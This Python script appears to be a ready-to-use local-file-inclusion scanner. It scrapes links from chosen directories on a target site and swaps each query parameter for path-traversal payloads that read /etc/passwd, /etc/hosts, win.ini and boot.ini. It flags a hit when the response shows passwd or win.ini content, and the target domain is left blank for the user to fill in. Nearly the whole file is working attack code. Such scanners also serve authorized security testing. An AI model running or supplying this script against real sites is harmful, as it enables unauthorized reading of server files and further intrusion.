import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

# Configuration
base_url = ""  # Change to target domain
# TODO: Update this with correct directories for each target
directories = ["/dir1/", "/dir2/"]  # Known directories on the web server

# LFI payloads
linux_payloads = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/hosts"
]

windows_payloads = [
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\boot.ini"
]


def get_urls_from_directory(directory):
    full_url = urljoin(base_url, directory)
    print(f"[+] Scraping: {full_url}")
    try:
        res = requests.get(full_url, timeout=10)
        res.raise_for_status()
        soup = BeautifulSoup(res.text, 'html.parser')
        links = [urljoin(full_url, a.get('href')) for a in soup.find_all('a', href=True)]
        return links
    except Exception as e:
        print(f"[-] Failed to scrape {full_url}: {e}")
        return []


def is_lfi_candidate(url):
    parsed = urlparse(url)
    return bool(parse_qs(parsed.query))  # URL has query parameters


def test_lfi(url, payloads):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query_params = parse_qs(parsed.query)

    for param in query_params:
        for payload in payloads:
            modified_params = query_params.copy()
            modified_params[param] = payload
            test_url = f"{base}?{'&'.join([f'{k}={v}' for k, v in modified_params.items()])}"
            try:
                res = requests.get(test_url, timeout=10)
                if "root:x:0:0:" in res.text or "[extensions]" in res.text:
                    print(f"[!] LFI Detected at: {test_url}")
                else:
                    print(f"[-] Tried: {test_url}")
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")


def main():
    all_urls = []
    for directory in directories:
        urls = get_urls_from_directory(directory)
        all_urls.extend(urls)

    print(f"[+] Found {len(all_urls)} URLs")

    for url in all_urls:
        if is_lfi_candidate(url):
            print(f"[+] Testing LFI on: {url}")
            test_lfi(url, linux_payloads + windows_payloads)


if __name__ == "__main__":
    main()
